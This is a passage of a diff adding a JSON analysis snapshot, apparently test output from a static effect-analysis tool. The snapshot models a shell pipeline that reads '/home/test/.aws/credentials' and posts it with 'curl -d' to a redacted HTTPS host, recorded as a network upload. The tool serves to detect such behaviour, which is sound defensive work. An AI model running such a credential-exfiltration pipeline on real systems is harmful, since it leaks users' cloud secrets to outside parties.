+            "id": "occurrence:blake3:0459678f329f871aaa4edc20999b1d72833a3b42acbbfb0a37d219214403de84",
+            "kind": "port",
+            "modality": "may",
+            "order": 30,
+            "port": "value",
+            "provenance": [
+              1
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e",
+            "kind": "port",
+            "modality": "may",
+            "order": 31,
+            "port": {
+              "arg": 1
+            },
+            "provenance": [
+              2
+            ]
+          }
+        ]
+      }
+    },
+    "coverage": {
+      "environment": {
+        "level": "full"
+      },
+      "filesystem": {
+        "level": "full"
+      },
+      "network": {
+        "level": "full"
+      },
+      "process": {
+        "level": "full"
+      }
+    },
+    "effects": [
+      {
+        "execution": 0,
+        "id": "effect:blake3:88fd5e0435b260150584f111c3c693b6c2e866e2645de0ff58541f6f3690c2c2",
+        "modality": "may",
+        "operation": "environment.read",
+        "provenance": [
+          1,
+          0
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "family": "environment_variable",
+            "name": "HOME"
+          }
+        }
+      },
+      {
+        "execution": 1,
+        "id": "effect:blake3:70485afeacb81925596691d2f113c93f820caa0dcc0329c41e4e3e2dacc74c0b",
+        "modality": "may",
+        "operation": "process.exec",
+        "provenance": [
+          4,
+          5
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "argv": [
+              {
+                "digest": "blake3:d2f1d86815dffb33",
+                "expr": "literal"
+              }
+            ],
+            "cwd": {
+              "expr": "concrete",
+              "identity": {
+                "digest": "blake3:51adc52efe5df1b6",
+                "family": "fs_path"
+              }
+            },
+            "executable": "cat",
+            "family": "process"
+          }
+        }
+      },
+      {
+        "execution": 1,
+        "id": "effect:blake3:c25b1b1104ca6e52f46cd59de39a311b6b74b84a6354280e1c40112c7f0aee3f",
+        "modality": "may",
+        "operation": "filesystem.read",
+        "provenance": [
+          5,
+          6
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "digest": "blake3:d2f1d86815dffb33",
+            "family": "fs_path"
+          }
+        }
+      },
+      {
+        "execution": 2,
+        "id": "effect:blake3:7c97d685d114049b0149da8d971aba08884fc8bb35bc448434b153ce874c39f9",
+        "modality": "may",
+        "operation": "process.exec",
+        "provenance": [
+          9,
+          10,
+          11,
+          12
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "argv": [
+              {
+                "digest": "blake3:cadfeb0ea99d7d4a",
+                "expr": "literal"
+              },
+              {
+                "digest": "blake3:2060a2aa45ef0ee7",
+                "expr": "literal"
+              },
+              {
+                "digest": "blake3:1784625b27fff424",
+                "expr": "literal"
+              }
+            ],
+            "cwd": {
+              "expr": "concrete",
+              "identity": {
+                "digest": "blake3:51adc52efe5df1b6",
+                "family": "fs_path"
+              }
+            },
+            "executable": "curl",
+            "family": "process"
+          }
+        }
+      },
+      {
+        "execution": 2,
+        "id": "effect:blake3:1afc852f1d850b1187f82edf906081767d2021f7721b84576912741057e8f9cf",
+        "modality": "may",
+        "operation": "network.upload",
+        "provenance": [
+          12,
+          13
+        ],
+        "request_assurance": "conservative",
+        "resource": {
+          "expr": "concrete",
+          "identity": {
+            "family": "network_endpoint",
+            "host": "blake3:90828ef08675ccbd",
+            "path": "blake3:9784f6462ac022ad",
+            "scheme": "https"
+          }
+        }
+      }
+    ],
+    "execution_graph": {
+      "edges": [
+        {
+          "evidence": [
+            2,
+            0
+          ],
+          "from": 0,
+          "kind": "launch",
+          "to": 1
+        },
+        {
+          "evidence": [
+            7,
+            0
+          ],
+          "from": 0,
+          "kind": "launch",
+          "to": 2
+        }
+      ],
+      "entry": 0,
+      "nodes": [
+        {
+          "assurance": "exact",
+          "cwd": {
+            "expr": "concrete",
+            "identity": {
+              "digest": "blake3:51adc52efe5df1b6",
+              "family": "fs_path"
+            }
+          },
+          "realm": {
+            "realm": "host"
+          },
+          "streams": {},
+          "subject": {
+            "digest": "blake3:84d32a4198a90dbc4ab7585afb240a36ad7e1721756faca4823cd8bf4af31add",
+            "kind": "shell"
+          }
+        },
+        {
+          "argv": [
+            {
+              "digest": "blake3:e9adf7d75d017486",
+              "expr": "literal"
+            },
+            {
+              "digest": "blake3:d2f1d86815dffb33",
+              "expr": "literal"
+            }
+          ],
+          "assurance": "exact",
+          "cwd": {
+            "expr": "concrete",
+            "identity": {
+              "digest": "blake3:51adc52efe5df1b6",
+              "family": "fs_path"
+            }
+          },
+          "environment": {
+            "HOME": {
+              "digest": "blake3:6fb62d0711fd91e1",
+              "expr": "literal"
+            }
+          },
+          "evidence": [
+            2,
+            0
+          ],
+          "realm": {
+            "realm": "host"
+          },
+          "source_span": {
+            "end": 22,
+            "start": 0
+          },
+          "streams": {
+            "stderr": {
+              "node": 0,
+              "stream": "stderr"
+            },
+            "stdin": {
+              "node": 0,
+              "stream": "stdin"
+            },
+            "stdout": {
+              "node": 2,
+              "stream": "stdin"
+            }
+          },
+          "subject": {
+            "digest": "blake3:509228b4ca6bf5b25f7d8217da4a4831a2f4c7e3d88987ef6827186ca0dfeabc",
+            "kind": "exec"
+          }
+        },
+        {
+          "argv": [
+            {
+              "digest": "blake3:2f3da98c40ec3da0",
+              "expr": "literal"
+            },
+            {
+              "digest": "blake3:cadfeb0ea99d7d4a",
+              "expr": "literal"
+            },
+            {
+              "digest": "blake3:2060a2aa45ef0ee7",
+              "expr": "literal"
+            },
+            {
+              "digest": "blake3:1784625b27fff424",
+              "expr": "literal"
+            }
+          ],
+          "assurance": "exact",
+          "cwd": {
+            "expr": "concrete",
+            "identity": {
+              "digest": "blake3:51adc52efe5df1b6",
+              "family": "fs_path"
+            }
+          },
+          "environment": {
+            "HOME": {
+              "digest": "blake3:6fb62d0711fd91e1",
+              "expr": "literal"
+            }
+          },
+          "evidence": [
+            7,
+            0
+          ],
+          "realm": {
+            "realm": "host"
+          },
+          "source_span": {
+            "end": 47,
+            "start": 25
+          },
+          "streams": {
+            "stderr": {
+              "node": 0,
+              "stream": "stderr"
+            },
+            "stdin": {
+              "node": 1,
+              "stream": "stdout"
+            },
+            "stdout": {
+              "node": 0,
+              "stream": "stdout"
+            }
+          },
+          "subject": {
+            "digest": "blake3:017b354f0a1c221e6b2bc396da8338dc7bdb79c14b80063110bea3e115948ebe",
+            "kind": "exec"
+          }
+        }
+      ]
+    },
+    "provenance": [
+      {
+        "kind": "host_context",
+        "name": "HOME"
+      },
+      {
+        "end": 22,
+        "kind": "source_span",
+        "start": 4
+      },
+      {
+        "end": 22,
+        "kind": "source_span",
+        "start": 0
+      },
+      {
+        "antecedents": [
+          2
+        ],
+        "kind": "execution",
+        "node": 1
+      },
+      {
+        "antecedents": [
+          3
+        ],
+        "index": 0,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          3,
+          0
+        ],
+        "index": 1,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          4
+        ],
+        "kind": "model_application",
+        "model": "coreutils/cat@v1#blake3:83c71be8eed13245ee0c2a3948fc03352fe33e16b748872b6ca4fcccdece2b84"
+      },
+      {
+        "end": 47,
+        "kind": "source_span",
+        "start": 25
+      },
+      {
+        "antecedents": [
+          7
+        ],
+        "kind": "execution",
+        "node": 2
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 0,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 1,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 2,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          8
+        ],
+        "index": 3,
+        "kind": "argument"
+      },
+      {
+        "antecedents": [
+          9
+        ],
+        "kind": "model_application",
+        "model": "net/curl@v0"
+      }
+    ],
+    "schema": "effinterp/plan-redacted/v1",
+    "subject": {
+      "digest": "blake3:84d32a4198a90dbc4ab7585afb240a36ad7e1721756faca4823cd8bf4af31add",
+      "kind": "shell"
+    }
+  },
+  "plan": {
+    "analysis": {
+      "engine_version": "0.1.0",
+      "limits": {
+        "max_analysis_bytes": 33554432,
+        "max_analysis_steps": 32768,
+        "max_boundaries": 4096,
+        "max_causal_depth": 256,
+        "max_causal_edges": 32768,
+        "max_causal_nodes": 16384,
+        "max_causal_pairs": 32768,
+        "max_effects": 4096,
+        "max_execution_depth": 8,
+        "max_execution_fanout": 256,
+        "max_execution_nodes": 4096,
+        "max_go_nodes": 20000,
+        "max_heredoc_expansions": 4096,
+        "max_java_nodes": 30000,
+        "max_js_nodes": 20000,
+        "max_patch_bytes": 4194304,
+        "max_patch_files": 2048,
+        "max_php_nodes": 20000,
+        "max_provenance_nodes": 65536,
+        "max_python_nodes": 80000,
+        "max_resolved_source_files": 64,
+        "max_ruby_nodes": 20000,
+        "max_rust_nodes": 20000,
+        "max_shell_function_depth": 8,
+        "max_shell_words": 4096,
+        "max_source_bytes": 4194304,
+        "max_value_cardinality": 64,
+        "max_value_depth": 24
+      },
+      "model_set": "builtin:blake3:412be1ea11cd035818957cfd02473da220c52267e7d6cd33761a51369229c197"
+    },
+    "causality": {
+      "coverage": {
+        "level": "full"
+      },
+      "graph": {
+        "edges": [
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e",
+            "modality": "may",
+            "order": 0,
+            "provenance": [
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e",
+            "modality": "may",
+            "order": 1,
+            "provenance": [
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:c6ad949414d9e25c26fd88553c7d9f61562b9513500b4b6c0ad33cc020ed8ace"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85",
+            "modality": "may",
+            "order": 2,
+            "provenance": [
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:11b1464a6b819364cb756128959351b4ab3af6ef1166c23c9946434ad5519b5c"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:0459678f329f871aaa4edc20999b1d72833a3b42acbbfb0a37d219214403de84",
+            "modality": "may",
+            "order": 3,
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:026d0c178343bc20171a64918bdca59deac65517433d936e56200a8f52c0992e"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:11b1464a6b819364cb756128959351b4ab3af6ef1166c23c9946434ad5519b5c",
+            "modality": "may",
+            "order": 4,
+            "provenance": [
+              0,
+              2,
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:941e54fd3ff05f267ea2d87f7426de59318a6e606ae2654c463413edd360de39"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a",
+            "modality": "may",
+            "order": 5,
+            "provenance": [
+              9,
+              10,
+              11,
+              12
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:6a16a142d7e2df7e4c553b404b66f67f34aad502d3d68e5a7b749ec9e40c9d81"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a",
+            "modality": "may",
+            "order": 6,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0",
+            "modality": "must-on-success",
+            "order": 7,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0",
+            "modality": "may",
+            "order": 8,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:26828f85a2271b01bd1e3c556a17277559d830df5a6dc75c02eb69fee57e2d3e",
+            "modality": "must-on-success",
+            "order": 9,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:23322457e6c2a10d6b7ac2868e47c6046f26ee37e047994e2c9ce12f5b5cc8e0"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0",
+            "modality": "must-on-success",
+            "order": 10,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0",
+            "modality": "may",
+            "order": 11,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:53ef1c67603219b85a7f0a460551c08cfeb86e9ef080e8ed3a287bcd05847fcf",
+            "modality": "must-on-success",
+            "order": 12,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:bd4f82fc2d6f5eacffc4cd0e5268f5c6039e795087cc64b55ce1333d11105999"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:888adf1f3f8f4e0fdb0b7ef2300496dbc32ab981242139d1f2e83d91d79053a0",
+            "modality": "may",
+            "order": 13,
+            "provenance": [
+              0,
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:ea0c1ba125cd735fe8b8a42baff37c86d4b2ec33d3091252e39a39cbb0bbac6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:8954c8c82fb00c711bd7e05dfa2b62e0522a3af2be43b48aaef342f2a3914743",
+            "modality": "must-on-success",
+            "order": 14,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:f96465b88d47f71f588a1fc0c3f38cf0e2815f036d0908b5d13dae8e5555149b"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:93ba8404624fd6f3ba59820b873f745d102b74dfee0447aa0651fafd22aab9d0",
+            "modality": "may",
+            "order": 15,
+            "provenance": [
+              1
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:0459678f329f871aaa4edc20999b1d72833a3b42acbbfb0a37d219214403de84"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:941e54fd3ff05f267ea2d87f7426de59318a6e606ae2654c463413edd360de39",
+            "modality": "may",
+            "order": 16,
+            "provenance": [
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af",
+            "modality": "must-on-success",
+            "order": 17,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af",
+            "modality": "may",
+            "order": 18,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:a38fdbb598f58484032acf5afa14e6c8ba2f543d03a60ca51e40c644da254ea3",
+            "modality": "must-on-success",
+            "order": 19,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:4549aeed118dd86b5e5c842279aee4db3b6233ec83854ea43ed0cc6fab5699c0"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:aa8658768b3c447da4d7242136bf2bb16eba797bc9e909bbb59679f234967901",
+            "modality": "may",
+            "order": 20,
+            "provenance": [
+              0,
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:ea0c1ba125cd735fe8b8a42baff37c86d4b2ec33d3091252e39a39cbb0bbac6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:b1c859528f9acec8f23be74256f5294b9c86a0b2b271298dde4e9a36d51bc3b2",
+            "modality": "must-on-success",
+            "order": 21,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:b2275def0912e43e021285bbf6e5f109ecef7f107d0572e215b8629c48d54de1",
+            "modality": "may",
+            "order": 22,
+            "provenance": [
+              0,
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:f1a8fb21c48a98280b1fa3dcf7fb49993e5caa60c9015c6b4ddd204f22293304"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:b2ef00366e681ccfb11d76df1dbb6c931995e0c429f025647b87a36441fcb3ba",
+            "modality": "must-on-success",
+            "order": 23,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "containment",
+            "to": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:bd4f82fc2d6f5eacffc4cd0e5268f5c6039e795087cc64b55ce1333d11105999",
+            "modality": "must-on-success",
+            "order": 24,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6",
+            "modality": "may",
+            "order": 25,
+            "provenance": [
+              7
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:b2275def0912e43e021285bbf6e5f109ecef7f107d0572e215b8629c48d54de1"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895",
+            "modality": "may",
+            "order": 26,
+            "provenance": [
+              5,
+              6
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:0279e9226ba910615718600c436e3bf62619b830454a68dcf443d37529847f85"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895",
+            "modality": "may",
+            "order": 27,
+            "provenance": [
+              4,
+              5
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:c6ad949414d9e25c26fd88553c7d9f61562b9513500b4b6c0ad33cc020ed8ace"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "modality": "must-on-success",
+            "order": 28,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "launch",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "modality": "may",
+            "order": 29,
+            "provenance": [
+              1,
+              0
+            ],
+            "reason": "control_dependency",
+            "to": "occurrence:blake3:93ba8404624fd6f3ba59820b873f745d102b74dfee0447aa0651fafd22aab9d0"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "modality": "must-on-success",
+            "order": 30,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "launch",
+            "to": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:f96465b88d47f71f588a1fc0c3f38cf0e2815f036d0908b5d13dae8e5555149b",
+            "modality": "must-on-success",
+            "order": 31,
+            "provenance": [
+              2,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439",
+            "modality": "may",
+            "order": 32,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:cc7c787b853f310851b0fe1878b3e549066c739ef9e38e54fc2fc81527da26e6"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "from": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269",
+            "modality": "must-on-success",
+            "order": 33,
+            "provenance": [
+              7,
+              0
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269",
+            "modality": "may",
+            "order": 34,
+            "provenance": [
+              12,
+              13
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:fe40e611b2e27e82c8ac6bf189c1d7fbd8061c9000649a03263c57a988e93439"
+          },
+          {
+            "assurance": "conservative",
+            "cardinality": {
+              "max": 1,
+              "min": 0
+            },
+            "from": "occurrence:blake3:fef2a62cdc3cfc6ed49ad8f58ef990e6f9425c8656ed48fb2b6b9a338ceff36b",
+            "modality": "may",
+            "order": 35,
+            "provenance": [
+              0,
+              2
+            ],
+            "reason": "value_dependency",
+            "to": "occurrence:blake3:8f0b31224254b484dd0e18bcc06f06338114d67a50088fa313943adc515717cf"
+          }
+        ],
+        "nodes": [
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 0,
+            "id": "occurrence:blake3:dbb290978e167a890c848996522c89d40de395f09f52b9b0b00900806ca5082a",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 0,
+            "port": "code"
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:da09f3e1fa276a333f4ae56e8c1128ed68bce41f09e888df897c49fd4ba62895",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 1,
+            "port": "code",
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:8954c8c82fb00c711bd7e05dfa2b62e0522a3af2be43b48aaef342f2a3914743",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 2,
+            "provenance": [
+              2,
+              0
+            ],
+            "value": {
+              "expr": "literal",
+              "value": "cat"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:f96465b88d47f71f588a1fc0c3f38cf0e2815f036d0908b5d13dae8e5555149b",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 3,
+            "port": {
+              "arg": 0
+            },
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:53ef1c67603219b85a7f0a460551c08cfeb86e9ef080e8ed3a287bcd05847fcf",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 4,
+            "provenance": [
+              2,
+              0
+            ],
+            "value": {
+              "expr": "literal",
+              "value": "/home/test/.aws/credentials"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 1,
+            "id": "occurrence:blake3:bd4f82fc2d6f5eacffc4cd0e5268f5c6039e795087cc64b55ce1333d11105999",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 5,
+            "port": {
+              "arg": 1
+            },
+            "provenance": [
+              2,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:2082fa20c61f9bbdb4845f44d0153ac8a6362ec1e355548ca64d8f76a28a1a6a",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 6,
+            "port": "code",
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:b2ef00366e681ccfb11d76df1dbb6c931995e0c429f025647b87a36441fcb3ba",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 7,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "expr": "literal",
+              "value": "curl"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:a04cc44d6d743ea3ae733c4d9cc8aa679751770efe7b0d6fb2c600e29289e6af",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 8,
+            "port": {
+              "arg": 0
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:b1c859528f9acec8f23be74256f5294b9c86a0b2b271298dde4e9a36d51bc3b2",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 9,
+            "provenance": [
+              7,
+              0
+            ],
+            "value": {
+              "expr": "literal",
+              "value": "-d"
+            }
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:fe89a86a4b65f730b98bb2928c5024c9c6a39cd30a0cedc16be6543edd315269",
+            "kind": "port",
+            "modality": "must-on-success",
+            "order": 10,
+            "port": {
+              "arg": 1
+            },
+            "provenance": [
+              7,
+              0
+            ]
+          },
+          {
+            "cardinality": {
+              "max": 1,
+              "min": 1
+            },
+            "execution": 2,
+            "id": "occurrence:blake3:26828f85a2271b01bd1e3c556a17277559d830df5a6dc75c02eb69fee57e2d3e",
+            "kind": "value",
+            "modality": "must-on-success",
+            "order": 11,
+            "provenance": [
